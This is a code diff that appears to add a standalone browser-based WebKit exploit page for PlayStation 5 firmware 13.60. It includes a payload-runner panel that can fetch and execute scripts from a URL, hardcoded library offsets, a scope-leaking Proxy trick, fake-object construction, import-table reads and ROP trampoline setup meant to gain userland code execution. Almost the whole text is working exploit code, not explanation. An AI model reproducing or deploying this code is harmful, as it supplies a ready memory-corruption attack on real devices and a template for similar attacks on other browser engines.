+    function stopExploit() {
+      try {
+        if (typeof global.__psaitoStop === "function") {
+          global.__psaitoStop();
+          glog("!! exploit stopped by user (retry loop halted).");
+        } else {
+          glog("!! __psaitoStop not available (exploit not armed?).");
+        }
+      } catch (e) { glog("!! stop failed: " + e); }
+    }
+    pnl.querySelector("#prun").addEventListener("click", runNamed);
+    pnl.querySelector("#ptestall").addEventListener("click", () => {
+      glog("== TEST ALL ==");
+      for (const p of KNOWN) { runFile(p); break; }
+    });
+    pnl.querySelector("#pgithub").addEventListener("click", openGitHubIssueWithLog);
+    pnl.querySelector("#pdiscord").addEventListener("click", () => sendFullLogToDiscord());
+    pnl.querySelector("#plogdl").addEventListener("click", downloadLog);
+    dlfab.addEventListener("click", downloadLog);
+    pnl.querySelector("#pstop2").addEventListener("click", stopExploit);
+    pnl.querySelector("#plogclr").addEventListener("click", () => {
+      logBuf.length = 0;
+      try { localStorage.removeItem(STORE_KEY); } catch (e) {}
+      pnl.querySelector("#plg").textContent = "log cleared.";
+    });
+    pnl.querySelector("#purlrun").addEventListener("click", () => {
+      const u = pnl.querySelector("#purl").value.trim();
+      if (!u) return;
+      fetchText(u, (err, src) => {
+        if (err) { glog("!! fetch url: " + err); return; }
+        runSource(u.split("/").pop(), src);
+      });
+    });
+    pnl.querySelector("#pstop").addEventListener("click", () => {
+      if (autoTimer) { clearTimeout(autoTimer); autoTimer = 0; }
+      pnl.querySelector("#plg").textContent = "reset (reload to re-exploit).";
+      setTimeout(() => location.reload(), 200);
+    });
+    function replaySaved() {
+      if (!logBuf.length) return;
+      const d = pnl.querySelector("#plg");
+      if (d.textContent.indexOf("--- previous run log ---") >= 0) return;
+      d.textContent = "--- previous run log ---\n" + logBuf.join("\n")
+        + "\n--- end previous log ---";
+      d.scrollTop = d.scrollHeight;
+    }
+    global.onBridgeReady = function (ps5) {
+      const apiReady = ps5 && ps5.ready === true
+        && typeof global.syscall === "function"
+        && typeof global.SYSCALL === "object";
+      setPayloadControlsEnabled(apiReady);
+      pnl.style.display = "block";
+      if (!apiReady) {
+        pnl.querySelector("#pmode").textContent = "bridge API incomplete";
+        glog("!! bridge callback lacked syscall globals; payload launch remains disabled");
+        return;
+      }
+      pnl.querySelector("#pmode").textContent =
+        "fw " + ps5.fw + " · mode " + ps5.mode +
+        (ps5.mode === "ROP" ? (ps5.stubMode ? " (X1NON stubs)" : "") : " (! syscall no-op)");
+      glog("bridge ready. heap=arena+0x2000..0x8000 pb=" + pb);
+      if (ps5.notes && ps5.notes.length) glog("notes: " + ps5.notes.join(" | "));
+      if (ps5.mode !== "ROP") {
+        glog("============ DIAG DIRECT MODE ============");
+        glog("syscall() unavailable -> bagagwa/aio cannot fire.");
+        glog("webkitBase = " + (ps5.webkitBase === null ? "null" : "0x" + Number(ps5.webkitBase).toString(16)));
+        glog("libkernel  = " + (ps5.libkernelBase === null ? "null" : "0x" + Number(ps5.libkernelBase).toString(16)));
+        glog("notes      = " + (ps5.notes && ps5.notes.length ? ps5.notes.join(" | ") : "(none)"));
+        glog("=========================================");
+      }
+      replaySaved();
+      if (auto && auto !== "0") {
+        glog("auto-run in 1.5s: " + auto + "  (?auto=0 disables)");
+        autoTimer = setTimeout(() => runFile(auto), 1500);
+      }
+    };
+    setTimeout(function () {
+      if (!global.PS5 || !global.PS5.ready) {
+        pnl.style.display = "block";
+        pnl.querySelector("#pmode").textContent = "no bridge (exploit did not complete)";
+        replaySaved();
+        glog("!! bridge did not arrive within 60s. The WebKit exploit did not reach SUCCESS.");
+      }
+    }, 60000);
+  })(window);
+
+  // -------------------------------------------------------------------
+  // EXPLOIT  (from modules/exploit.js, IIFE-wrapped, 13.60 defaults)
+  // -------------------------------------------------------------------
+  (function () {
+    "use strict";
+
+    const Q = new URLSearchParams(location.search);
+
+    function intParam(name, fallback, lo, hi) {
+      const raw = parseInt(Q.get(name) ?? "", 10);
+      return Number.isFinite(raw) ? Math.max(lo, Math.min(hi, raw)) : fallback;
+    }
+    function hexListParam(name, fallback) {
+      const v = Q.get(name);
+      if (!v) return fallback;
+      const out = [];
+      for (const part of v.split(",")) {
+        const raw = parseInt(part, 16);
+        if (Number.isFinite(raw) && raw > 0) out.push(raw);
+      }
+      return out.length ? out : fallback;
     }
 
-    button.addEventListener("click", runTests);
-    sendButton.addEventListener("click", sendLog);
-  </script>
+    // --- 13.60 defaults (was 11.x in the original exploit.js) ---
+    const P_HOST_CTOR_LIST = hexListParam("hc", [0x56a58, 0x56ca0, 0x57ce8]);
+    const P_NOTIFY_L    = hexListParam("notify", [0x48b0]);
+    const P_GADGET_L    = hexListParam("gd", [0x1d6fa]);
+    const P_GSLOT_L     = hexListParam("gps", [0x334e238]);
+    const P_GEXP_L      = hexListParam("gpe", [0x1b860]);
+    const P_CSLOT_L     = hexListParam("cls", [0x334e228]);
+    const P_CEXP_L      = hexListParam("cle", [0x274e0]);
+    const P_ESLOT_L     = hexListParam("ers", [0x334e230]);
+    const P_EEXP_L      = hexListParam("ere", [0xf7d0]);
+    let P_NOTIFY = P_NOTIFY_L[0];
+    let P_GADGET = P_GADGET_L[0];
+    let P_GETPID_SLOT = P_GSLOT_L[0];
+    let P_GETPID_EXP = P_GEXP_L[0];
+    let P_CLOSE_SLOT = P_CSLOT_L[0];
+    let P_CLOSE_EXP = P_CEXP_L[0];
+    let P_ERROR_SLOT = P_ESLOT_L[0];
+    let P_ERROR_EXP = P_EEXP_L[0];
+    const NPERFILS = Math.min(P_NOTIFY_L.length, P_GADGET_L.length,
+      P_GSLOT_L.length, P_GEXP_L.length, P_CSLOT_L.length, P_CEXP_L.length,
+      P_ESLOT_L.length, P_EEXP_L.length);
+    let perfilIndex = -1;
+    let profileAttempt = 0;
+    function applyProfile(i) {
+      i = ((i % NPERFILS) + NPERFILS) % NPERFILS;
+      perfilIndex = i;
+      P_NOTIFY = P_NOTIFY_L[i]; P_GADGET = P_GADGET_L[i];
+      P_GETPID_SLOT = P_GSLOT_L[i]; P_GETPID_EXP = P_GEXP_L[i];
+      P_CLOSE_SLOT = P_CSLOT_L[i]; P_CLOSE_EXP = P_CEXP_L[i];
+      P_ERROR_SLOT = P_ESLOT_L[i]; P_ERROR_EXP = P_EEXP_L[i];
+      NATURAL_TRAMPOLINE_OFFSET = P_GADGET;
+      NOTIFY_OFFSET = P_NOTIFY;
+    }
+
+    const DRAIN_COUNT = intParam("n", 64, 64, 1024);
+    const REVISION = "renderer-notify-auto-proof-11-v17-13.60-standalone";
+    const AUTO_RETRY_DELAY_MS = intParam("rd", 3000, 0, 60000);
+    const MAX_ATTEMPTS = intParam("max", 1, 0, 1000000);
+    const SCREEN_LINES = intParam("lines", 200, 0, 5000);
+    const K = 2;
+    const DUPLICATE_INDEX = 2;
+    const CONTROL_INDEX = 0xffff;
+    const CONTROL_INT = -64000;
+    const FILLER_BIGINTS = K - 1;
+    const FILLER_OBJECTS = 0xfffe - K;
+    const EXPECTED_LENGTH = 0x50001;
+    const CELL_BYTES = 0x30;
+    const FUNCTION_BYTES = 0x20;
+    const NATIVE_EXECUTABLE_BYTES = 0x38;
+    const HOLDER_BYTES = 0x40;
+    const ARENA_VIEW_BYTES = 0x30;
+    const COLLATOR_BYTES = 0x38;
+    const BOUND_COMPARE_BYTES = 0x20;
+    const PARSEINT_NATIVE_OFFSET = 0x1ea18;
+    let HOST_CONSTRUCTOR_OFFSET = P_HOST_CTOR_LIST[0];
+    const WEBKIT_TEXT_SIZE = 0x2c7c000;
+    const WEBKIT_RELRO_START = 0x32d8000;
+    const WEBKIT_RELRO_END = 0x34f7e48;
+    const IMPORT_WINDOW_A_OFFSET = 0x34f5708;
+    const IMPORT_WINDOW_A_BYTES = 0xd0;
+    const IMPORT_WINDOW_B_OFFSET = 0x34f5860;
+    const IMPORT_WINDOW_B_BYTES = 0x38;
+    const REQUIREMENTS_OBJECT_A_SLOT = 0x00;
+    const REQUIREMENTS_OBJECT_A_OFFSET = 0x29f350;
+    const REQUIREMENTS_OBJECT_B_SLOT = 0x08;
+    const REQUIREMENTS_OBJECT_B_OFFSET = 0x29f348;
+    const KERNEL_OBJECT_SLOT = 0x10;
+    const KERNEL_OBJECT_OFFSET = 0x6d1d0;
+    const CXA_FINALIZE_SLOT = 0x40;
+    const CXA_FINALIZE_OFFSET = 0x173e0;
+    const STRLEN_SLOT = 0x70;
+    const STRLEN_OFFSET = 0x44c0;
+    const CLOSE_SLOT = 0xa0;
+    const CLOSE_OFFSET = 0x26e70;
+    const ERROR_SLOT = 0xa8;
+    const ERROR_OFFSET = 0xf340;
+    const GETPID_SLOT = 0xb0;
+    const GETPID_OFFSET = 0x1b280;
+    const STRERROR_SLOT = 0xc8;
+    const STRERROR_OFFSET = 0x77070;
+    const PTHREAD_GETSPECIFIC_SLOT = 0x00;
+    const PTHREAD_GETSPECIFIC_OFFSET = 0x40dd0;
+    const MEMCHR_SLOT = 0x30;
+    const MEMCHR_OFFSET = 0x3c40;
+    const LIBC_TEXT_SIZE = 0x128000;
+    const KERNEL_TEXT_SIZE = 0x44000;
+    let NATURAL_TRAMPOLINE_OFFSET = P_GADGET;
+    let NOTIFY_OFFSET = P_NOTIFY;
+    const NOTIFICATION_REQUEST_SIZE = 0xc30;
+    const NOTIFICATION_MESSAGE_OFFSET = 0x2d;
+    const NOTIFICATION_MESSAGE = "Userland";
+    const ARENA_BYTES = 0x10000;
+    const FAKE_UCOLLATOR_OFFSET = 0x100;
+    const FAKE_VTABLE_OFFSET = 0x300;
+    const CARRIER_SLOTS = 9000000;
+    const CARRIER_BYTES = CARRIER_SLOTS * 8;
+    const CAPTURE_DELAY_MS = intParam("cap", 50, 0, 60000);
+    const COMPOSE_DELAY_MS = CAPTURE_DELAY_MS + intParam("gap", 50, 0, 60000);
+    const symbolToString = Symbol.prototype.toString;
+    const DRAIN_SIZE = 0x10000;
+    const SLAB_SIZE = 0x400000;
+    const BUTTERFLY_HOLE_SIZE = 0x81000;
+    const SEPARATOR_SIZE = 0x10000;
+    const EARLY_HOLE_SIZE = 0x70000;
+    const GUARD_SIZE = 0x90000;
+    const PREDECESSOR_SIZE = 0x80000;
+    const FINAL_HOLE_SIZE = 0x80000;
+
+    const rwHeader = new Uint8Array(CELL_BYTES);
+    const targetHeader = new Uint8Array(NATIVE_EXECUTABLE_BYTES);
+    const holderHeader = new Uint8Array(HOLDER_BYTES);
+    const arenaViewHeader = new Uint8Array(ARENA_VIEW_BYTES);
+    const collatorHeader = new Uint8Array(COLLATOR_BYTES);
+    const compareFnHeader = new Uint8Array(BOUND_COMPARE_BYTES);
+    const collatorOriginal = new Uint8Array(COLLATOR_BYTES - 0x18);
+    const importWindowA1 = new Uint8Array(IMPORT_WINDOW_A_BYTES);
+    const importWindowA2 = new Uint8Array(IMPORT_WINDOW_A_BYTES);
+    const importWindowB1 = new Uint8Array(IMPORT_WINDOW_B_BYTES);
+    const importWindowB2 = new Uint8Array(IMPORT_WINDOW_B_BYTES);
+    const scratchBits = new ArrayBuffer(8);
+    const scratchBytes = new Uint8Array(scratchBits);
+    const scratchWords = new Uint32Array(scratchBits);
+    const scratchDouble = new Float64Array(scratchBits);
+
+    const navigationID = Date.now().toString(36);
+    const explicitAuto = Q.get("auto");
+    const autoMode = explicitAuto !== null && explicitAuto !== "0";
+    const armed = Q.get("go") === "1";
+    const runScope = (Q.get("run") || "default")
+      .replace(/[^a-zA-Z0-9_-]/g, "").slice(0, 80) || "default";
+    const attemptKey = `${REVISION}:${runScope}:attempts`;
+    const passKey = `${REVISION}:${runScope}:passed`;
+    const blockKey = `${REVISION}:${runScope}:blocked`;
+
+    let priorAttempts = 0;
+    let alreadyPassed = false;
+    let alreadyBlocked = false;
+    try {
+      priorAttempts = parseInt(sessionStorage.getItem(attemptKey) ?? "0", 10);
+      if (!Number.isFinite(priorAttempts) || priorAttempts < 0) priorAttempts = 0;
+      alreadyPassed = sessionStorage.getItem(passKey) === "1";
+      alreadyBlocked = sessionStorage.getItem(blockKey) === "1";
+    } catch {}
+    let attemptNumber = priorAttempts + 1;
+    let seq = 0;
+    let keepIndex = 0;
+    let stopped = false;
+    let keepAlive = null;
+    const screenLines = [];
+
+    let referenceTarget = null;
+    let rwBuffer = null;
+    let rwView = null;
+    let rwMirror = null;
+    let carrierCandidate = null;
+    let targetBuffer = null;
+    let targetView = null;
+    let nativeTarget = parseInt;
+    let fakeHost = null;
+    let lengthWord = null;
+    let arenaBuffer = null;
+    let arenaView = null;
+    let realCollator = null;
+    let compareFn = null;
+    let notificationRequest = "";
+    let notificationRequestOK = false;
+    let notificationPrewarmResult = 0;
+    let targetHolder = null;
+    let holderGuardA = null;
+    let holderGuardB = null;
+    let fillerGraph = null;
+    let outerGraph = null;
+    let leakedScope = null;
+    let getterCarrier = null;
+    let preparedSymbolObject = null;
+    let capturedString = null;
+    let capturedWords = null;
+    let copiedLength = 0;
+    let captureState = 0;
+    let captureError = null;
+    let hostAddress = NaN;
+    let fakeAddress = NaN;
+    let predecessorWords = null;
+    let pointerLow = 0;
+    let pointerHigh = 0;
+    let targetAddress = NaN;
+    let targetAddressLow = 0;
+    let targetAddressHigh = 0;
+    let nativeTargetAddress = NaN;
+    let arenaViewAddress = NaN;
+    let realCollatorAddress = NaN;
+    let compareFnAddress = NaN;
+    let rwOriginalVector = NaN;
+    let rwHeaderOK = false;
+    let functionHeaderOK = false;
+    let nativeExecutableHeaderOK = false;
+    let functionStructureID = 0;
+    let nativeExecutableStructureID = 0;
+    let executableAddress = NaN;
+    let nativeFunctionAddress = NaN;
+    let nativeConstructorAddress = NaN;
+    let webkitBase = NaN;
+    let webkitBaseOK = false;
+    let pointersRepeated = false;
+    let restoreObserved = false;
+    let retrySafe = false;
+    let retryScheduled = false;
+    let attemptPersisted = false;
+    let candidateEverReturned = false;
+    let candidateMutationStarted = false;
+    let zeroHeaderMiss = false;
+    let gotReadAttempted = false;
+    let gotWindowAddressesOK = false;
+    let gotWindowsRepeated = false;
+    let gotCanonicalOK = false;
+    let gotReadOK = false;
+    let requirementsObjectA = 0;
+    let requirementsObjectB = 0;
+    let requirementsBase = NaN;
+    let requirementsBaseOK = false;
+    let kernelObjectPointer = 0;
+    let kernelObjectBase = NaN;
+    let kernelObjectBaseOK = false;
+    let cxaFinalizePointer = 0;
+    let strlenPointer = 0;
+    let strerrorPointer = 0;
+    let memchrPointer = 0;
+    let closePointer = 0;
+    let errorPointer = 0;
+    let getpidPointer = 0;
+    let pthreadGetspecificPointer = 0;
+    let cxaFinalizeStatus = 0;
+    let strlenStatus = 0;
+    let strerrorStatus = 0;
+    let memchrStatus = 0;
+    let closeStatus = 0;
+    let errorStatus = 0;
+    let getpidStatus = 0;
+    let pthreadGetspecificStatus = 0;
+    let libcBase = NaN;
+    let libcResolvedCount = 0;
+    let libcBaseOK = false;
+    let kernelBase = NaN;
+    let kernelResolvedCount = 0;
+    let kernelBaseOK = false;
+    let holderHeaderOK = false;
+    let arenaViewHeaderOK = false;
+    let collatorHeaderOK = false;
+    let compareFnHeaderOK = false;
+    let arenaBacking = NaN;
+    let arenaBackingRepeated = false;
+    let fakeUCollatorAddress = NaN;
+    let fakeVtableAddress = NaN;
+    let naturalTrampolineAddress = NaN;
+    let notifyEntryAddress = NaN;
+    let notifyAddressOK = false;
+    let arenaLayoutOK = false;
+    let arenaFilledOK = false;
+    let carrierArmedForCommit = false;
+    let notifyReady = false;
+    let commitStarted = false;
+    let commitBlockConfirmed = false;
+    let compositionState = 0;
+    let compositionLength = 0;
+    let compositionError = null;
+    let compositionStage = "idle";
+
+    const USER_AGENT_FW = (function () {
+      const m = /PlayStation 5\/(\d+\.\d+)/.exec(navigator.userAgent);
+      return m ? m[1] : "??.??";
+    })();
+    const FW_LABEL = (function () {
+      const p = Q.get("fw");
+      if (p) return p;
+      return USER_AGENT_FW;
+    })();
+    // 13.60 accepted here because the running exploit publishes 13.60 offsets.
+    const NOTIFY_TARGET_VERIFIED = (FW_LABEL === "11.60" || FW_LABEL === "13.60")
+      && USER_AGENT_FW === FW_LABEL;
+
+    try { document.getElementById("fw-label").textContent = "FW " + FW_LABEL; } catch {}
+
+    function statusText(text, cls) {
+      try {
+        const node = document.getElementById("status");
+        node.textContent = text;
+        node.className = "status-text " + (cls || "");
+      } catch {}
+    }
+    function screenLine(text) {
+      screenLines.push(text.length > 110 ? `${text.slice(0, 107)}...` : text);
+      if (screenLines.length > SCREEN_LINES)
+        screenLines.splice(0, screenLines.length - SCREEN_LINES);
+      try {
+        const scr = document.getElementById("scr");
+        const atBottom = scr.scrollHeight - scr.scrollTop - scr.clientHeight < 24;
+        scr.textContent = screenLines.join("\n");
+        if (atBottom) scr.scrollTop = scr.scrollHeight;
+      } catch {}
+    }
+
+    const LOG_SERVER = (Q.get("logserver"))
+      || (typeof window !== "undefined" && window.LOG_SERVER)
+      || (`http://${location.hostname}:8080/log`);
+    const LOG_ON = Q.get("log") === "1"
+      || (Q.get("log") !== "0" && !/github\.io$/i.test(location.hostname));
+
+    function mark(tag, extra) {
+      seq++;
+      const line_ = `a${attemptNumber}-r${navigationID}-s${seq}-note-${tag}`
+        + (extra !== undefined ? `-${extra}` : "");
+      if (LOG_ON) {
+        try {
+          const xhr = new XMLHttpRequest();
+          xhr.open("POST", LOG_SERVER, true);
+          xhr.setRequestHeader("Content-Type", "text/plain");
+          xhr.send(line_);
+        } catch {}
+      }
+      screenLine(`[${String(attemptNumber).padStart(3, "0")}] ${tag}`
+        + (extra !== undefined ? ` ${extra}` : ""));
+    }
+
+    function failed() {
+      mark("AUTO-RETRY-AFTER-FAILURE", `attempt=${attemptNumber}`);
+      if (stopped) return;
+      if (MAX_ATTEMPTS && attemptNumber >= MAX_ATTEMPTS) {
+        stopped = true;
+        mark("ATTEMPT-CEILING", `attempt=${attemptNumber}-max=${MAX_ATTEMPTS}-stopped=true`);
+        statusText(`Stopped after ${attemptNumber} attempts`, "failed");
+        screenLine("");
+        screenLine(`STOPPED after ${attemptNumber} attempts (max=${MAX_ATTEMPTS})`);
+        try {
+          if (typeof globalThis.__psaitoRunComplete === "function")
+            globalThis.__psaitoRunComplete({ attempt: attemptNumber, max: MAX_ATTEMPTS });
+        } catch (e) {}
+        return;
+      }
+      retryScheduled = false;
+      statusText(`Retrying (attempt ${attemptNumber + 1})`, "running");
+      setTimeout(() => {
+        try { history.replaceState(null, ""); } catch {}
+        attemptNumber++;
+        startAttempt();
+      }, AUTO_RETRY_DELAY_MS);
+    }
+    function succeeded(detail) {
+      stopped = true;
+      statusText(`SUCCESS - BragaTy (attempt ${attemptNumber})`, "success");
+      screenLine("");
+      screenLine(`*** SUCCESS *** ${detail}`);
+      try {
+        const b = document.getElementById("banner");
+        if (b) { b.className = "ok"; b.textContent = "USERLAND ACHIEVED — BragaTy"; }
+      } catch {}
+    }
+    function hex(value) { return `0x${value.toString(16)}`; }
+    function buffer(size) { return new ArrayBuffer(size); }
+    function allZero(bytes, start, end) {
+      for (let i = start; i < end; ++i) if (bytes[i] !== 0) return false;
+      return true;
+    }
+    function uint32At(bytes, offset) {
+      return bytes[offset] + bytes[offset+1]*0x100 + bytes[offset+2]*0x10000 + bytes[offset+3]*0x1000000;
+    }
+    function low48At(bytes, offset) {
+      return bytes[offset] + bytes[offset+1]*0x100 + bytes[offset+2]*0x10000
+        + bytes[offset+3]*0x1000000 + bytes[offset+4]*0x100000000
+        + bytes[offset+5]*0x10000000000;
+    }
+    function putLow48(bytes, offset, value) {
+      if (!plausibleAddress(value)) throw new Error("putLow48-invalid-value");
+      const high = Math.floor(value / 0x100000000);
+      const low = value - high * 0x100000000;
+      bytes[offset] = low & 0xff;
+      bytes[offset+1] = Math.floor(low / 0x100) & 0xff;
+      bytes[offset+2] = Math.floor(low / 0x10000) & 0xff;
+      bytes[offset+3] = Math.floor(low / 0x1000000) & 0xff;
+      bytes[offset+4] = high & 0xff;
+      bytes[offset+5] = Math.floor(high / 0x100) & 0xff;
+      bytes[offset+6] = 0;
+      bytes[offset+7] = 0;
+    }
+    function low48StoredExactly(bytes, offset, value) {
+      return low48At(bytes, offset) === value
+        && bytes[offset+6] === 0 && bytes[offset+7] === 0;
+    }
+    function readBytes(destination, source, count) {
+      for (let i = 0; i < count; ++i) destination[i] = source[i];
+    }
+    function sameBytes(left, right, count) {
+      for (let i = 0; i < count; ++i) if (left[i] !== right[i]) return false;
+      return true;
+    }
+    function readTwiceMatches(destination, source, count) {
+      readBytes(destination, source, count);
+      return sameBytes(destination, source, count);
+    }
+    function aimCarrier(candidate, address) {
+      const high = Math.floor(address / 0x100000000);
+      scratchWords[0] = address - high * 0x100000000;
+      scratchWords[1] = high;
+      for (let i = 0; i < 8; ++i) candidate[0x10 + i] = scratchBytes[i];
+    }
+    function restoreCarrier(candidate) {
+      for (let i = 0; i < 8; ++i) candidate[0x10 + i] = rwHeader[0x10 + i];
+    }
+    function pointerFromWords(words, offset) {
+      if (words[offset + 3] !== 0) return NaN;
+      return words[offset] + words[offset+1]*0x10000 + words[offset+2]*0x100000000;
+    }
+    function plausibleCell(value) {
+      return value > 0x100000000 && value <= 0xffffffffffff
+        && value <= 9007199254740991 && Math.floor(value) === value
+        && value % 8 === 0;
+    }
+    function plausibleAddress(value) {
+      return value > 0x100000000 && value <= 0xffffffffffff
+        && value <= 9007199254740991 && Math.floor(value) === value;
+    }
+    function canonicalLow48(bytes, offset) {
+      return bytes[offset+6] === 0 && bytes[offset+7] === 0;
+    }
+    function inPS5UserModuleBand(value) {
+      return value >= 0x800000000 && value < 0x900000000;
+    }
+    function dumpHex(bytes, count) {
+      let out = "";
+      for (let i = 0; i < count; ++i) out += bytes[i].toString(16).padStart(2, "0");
+      return out;
+    }
+    function encodedHeaderNumber() {
+      const raw = new ArrayBuffer(8);
+      const u32 = new Uint32Array(raw);
+      const f64 = new Float64Array(raw);
+      u32[0] = 0x00004250;
+      u32[1] = 0x01062800;
+      return f64[0];
+    }
+    function scheduleSafeRetry(reason) {
+      if (retryScheduled || stopped) return;
+      const candidateStateSafe = !candidateEverReturned
+        || (zeroHeaderMiss && !candidateMutationStarted);
+      if (!autoMode || !retrySafe || !candidateStateSafe
+          || candidateMutationStarted || commitStarted
+          || carrierArmedForCommit || alreadyBlocked || !attemptPersisted) {
+        mark("AUTO-RETRY-NOT-SCHEDULED", `reason=${reason}`
+          + `-auto=${autoMode}-safe=${retrySafe}`
+          + `-candidate-seen=${candidateEverReturned}`
+          + `-candidate-state-safe=${candidateStateSafe}`
+          + `-commit=${commitStarted}-armed=${carrierArmedForCommit}`
+          + `-preblocked=${alreadyBlocked}`
+          + `-attempt-persisted=${attemptPersisted}`);
+        failed();
+        return;
+      }
+      if (MAX_ATTEMPTS && attemptNumber >= MAX_ATTEMPTS) {
+        mark("ATTEMPT-CEILING", `reason=${reason}-max=${MAX_ATTEMPTS}`);
+        failed();
+        return;
+      }
+      retryScheduled = true;
+      const nextAttempt = attemptNumber + 1;
+      mark("AUTO-RETRY-SCHEDULED", `reason=${reason}-next-attempt=${nextAttempt}-delay-ms=${AUTO_RETRY_DELAY_MS}`);
+      setTimeout(() => {
+        let storageStillSafe = false;
+        const candidateStillSafe = !candidateEverReturned
+          || (zeroHeaderMiss && !candidateMutationStarted);
+        try {
+          storageStillSafe = sessionStorage.getItem(passKey) === null
+            && sessionStorage.getItem(blockKey) === null;
+        } catch {}
+        if (!storageStillSafe || !retrySafe || !candidateStillSafe
+            || candidateMutationStarted || commitStarted
+            || carrierArmedForCommit || stopped) {
+          mark("AUTO-RETRY-CANCELLED", `reason=${reason}`);
+          failed();
+          return;
+        }
+        attemptNumber = nextAttempt;
+        startAttempt();
+      }, AUTO_RETRY_DELAY_MS);
+    }
+    function finishEarlySafeAttempt(tag, extra, reason) {
+      retrySafe = true;
+      mark(tag, `${extra}-retry-safe=true-candidate-seen=false-candidate-mutated=false`);
+      scheduleSafeRetry(reason);
+    }
+    function resetAttemptState() {
+      referenceTarget = null; rwBuffer = null; rwView = null; rwMirror = null;
+      targetBuffer = null; targetView = null; fakeHost = null; lengthWord = null;
+      arenaBuffer = null; arenaView = null; realCollator = null; compareFn = null;
+      notificationRequest = ""; notificationRequestOK = false;
+      notificationPrewarmResult = 0; targetHolder = null; holderGuardA = null;
+      holderGuardB = null; fillerGraph = null; outerGraph = null;
+      leakedScope = null; getterCarrier = null; preparedSymbolObject = null;
+      capturedString = null; capturedWords = null; copiedLength = 0;
+      captureState = 0; captureError = null; hostAddress = NaN; fakeAddress = NaN;
+      predecessorWords = null; keepAlive = new Array(DRAIN_COUNT + 3);
+      keepIndex = 0; pointerLow = 0; pointerHigh = 0; targetAddress = NaN;
+      targetAddressLow = 0; targetAddressHigh = 0; nativeTargetAddress = NaN;
+      arenaViewAddress = NaN; realCollatorAddress = NaN; compareFnAddress = NaN;
+      rwOriginalVector = NaN; rwHeaderOK = false; functionHeaderOK = false;
+      nativeExecutableHeaderOK = false; functionStructureID = 0;
+      nativeExecutableStructureID = 0; executableAddress = NaN;
+      nativeFunctionAddress = NaN; nativeConstructorAddress = NaN;
+      webkitBase = NaN; webkitBaseOK = false; pointersRepeated = false;
+      restoreObserved = false; retrySafe = false; retryScheduled = false;
+      candidateEverReturned = false; candidateMutationStarted = false;
+      zeroHeaderMiss = false; gotReadAttempted = false; gotWindowAddressesOK = false;
+      gotWindowsRepeated = false; gotCanonicalOK = false; gotReadOK = false;
+      requirementsObjectA = 0; requirementsObjectB = 0; requirementsBase = NaN;
+      requirementsBaseOK = false; kernelObjectPointer = 0; kernelObjectBase = NaN;
+      kernelObjectBaseOK = false; cxaFinalizePointer = 0; strlenPointer = 0;
+      strerrorPointer = 0; memchrPointer = 0; closePointer = 0; errorPointer = 0;
+      getpidPointer = 0; pthreadGetspecificPointer = 0; cxaFinalizeStatus = 0;
+      strlenStatus = 0; strerrorStatus = 0; memchrStatus = 0; closeStatus = 0;
+      errorStatus = 0; getpidStatus = 0; pthreadGetspecificStatus = 0;
+      libcBase = NaN; libcResolvedCount = 0; libcBaseOK = false;
+      kernelBase = NaN; kernelResolvedCount = 0; kernelBaseOK = false;
+      holderHeaderOK = false; arenaViewHeaderOK = false; collatorHeaderOK = false;
+      compareFnHeaderOK = false; arenaBacking = NaN; arenaBackingRepeated = false;
+      fakeUCollatorAddress = NaN; fakeVtableAddress = NaN;
+      naturalTrampolineAddress = NaN; notifyEntryAddress = NaN;
+      notifyAddressOK = false; arenaLayoutOK = false; arenaFilledOK = false;
+      carrierArmedForCommit = false; notifyReady = false; commitStarted = false;
+      commitBlockConfirmed = false; compositionState = 0; compositionLength = 0;
+      compositionError = null; compositionStage = "idle";
+      rwHeader.fill(0); targetHeader.fill(0); holderHeader.fill(0);
+      arenaViewHeader.fill(0); collatorHeader.fill(0); compareFnHeader.fill(0);
+      collatorOriginal.fill(0); importWindowA1.fill(0); importWindowA2.fill(0);
+      importWindowB1.fill(0); importWindowB2.fill(0);
+    }
+
+    function buildNotificationRequest() {
+      const trailing = NOTIFICATION_REQUEST_SIZE - NOTIFICATION_MESSAGE_OFFSET
+        - NOTIFICATION_MESSAGE.length;
+      if (trailing < 1) throw new Error("notification-message-too-long");
+      notificationRequest = "\x00".repeat(NOTIFICATION_MESSAGE_OFFSET)
+        + NOTIFICATION_MESSAGE + "\x00".repeat(trailing);
+      notificationRequestOK = notificationRequest.length === NOTIFICATION_REQUEST_SIZE;
+      for (let p = 0; p < NOTIFICATION_MESSAGE_OFFSET; ++p)
+        if (notificationRequest.charCodeAt(p) !== 0) notificationRequestOK = false;
+      for (let m = 0; m < NOTIFICATION_MESSAGE.length; ++m) {
+        const messageCode = notificationRequest.charCodeAt(NOTIFICATION_MESSAGE_OFFSET + m);
+        if (messageCode !== NOTIFICATION_MESSAGE.charCodeAt(m) || messageCode > 0x7f)
+          notificationRequestOK = false;
+      }
+      for (let t = NOTIFICATION_MESSAGE_OFFSET + NOTIFICATION_MESSAGE.length;
+           t < NOTIFICATION_REQUEST_SIZE; ++t)
+        if (notificationRequest.charCodeAt(t) !== 0) notificationRequestOK = false;
+      if (!notificationRequestOK) throw new Error("notification-request-layout-failed");
+    }
+    function leakScopeObject() {
+      class Leaker { leak() { return super.foo; } }
+      Leaker.prototype.__proto__ = new Proxy({}, {
+        get: function (target, property, receiver) { return receiver; }
+      });
+      const leak = Leaker.prototype.leak;
+      return (function () { return leak(); })();
+    }
+    function prepareSymbolWrapper(F) {
+      leakedScope = leakScopeObject();
+      if (leakedScope === undefined || leakedScope === null)
+        throw new Error("scope-not-leaked");
+      for (let i = 0; i < 512; i++) leakedScope[`p${i}`] = i;
+      for (let j = 0; j < 8; j++) leakedScope[j] = 1.1 * j;
+      Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
+      return Object(leakedScope.g);
+    }
+    function buildFakeHost() {
+      rwBuffer = new ArrayBuffer(0x100);
+      rwView = new Uint8Array(rwBuffer);
+      rwMirror = new Uint8Array(rwBuffer);
+      rwMirror[0] = 0x3c;
+      targetBuffer = new ArrayBuffer(0x20);
+      targetView = new Uint8Array(targetBuffer);
+      targetView[0] = 0xa5;
+      lengthWord = { keep: 0x51515151 };
+      fakeHost = {
+        q0: encodedHeaderNumber(), q1: 1.1, q2: rwView,
+        q3: lengthWord, q4: 2.2, q5: 3.3
+      };
+      delete fakeHost.q1; delete fakeHost.q4; delete fakeHost.q5;
+      if (!Number.isFinite(fakeHost.q0) || fakeHost.q2 !== rwView
+          || fakeHost.q3 !== lengthWord || rwView[0] !== 0x3c
+          || targetView[0] !== 0xa5 || typeof nativeTarget !== "function")
+        throw new Error("fake-host-shape-failed");
+      arenaBuffer = new ArrayBuffer(ARENA_BYTES);
+      arenaView = new Uint8Array(arenaBuffer);
